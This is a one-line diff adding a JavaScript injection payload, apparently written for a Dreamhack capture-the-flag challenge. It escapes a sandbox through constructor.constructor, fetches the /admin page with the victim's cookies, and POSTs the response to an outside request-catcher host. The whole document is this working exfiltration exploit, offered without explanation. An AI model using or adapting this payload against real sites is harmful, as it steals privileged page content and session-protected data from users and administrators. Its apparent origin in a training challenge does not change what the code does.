@@ -1,0 +1,1 @@
+=constructor.constructor('fetch("/admin",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://oajaenk.request.dreamhack.games",{method:"POST",body:d}))')()
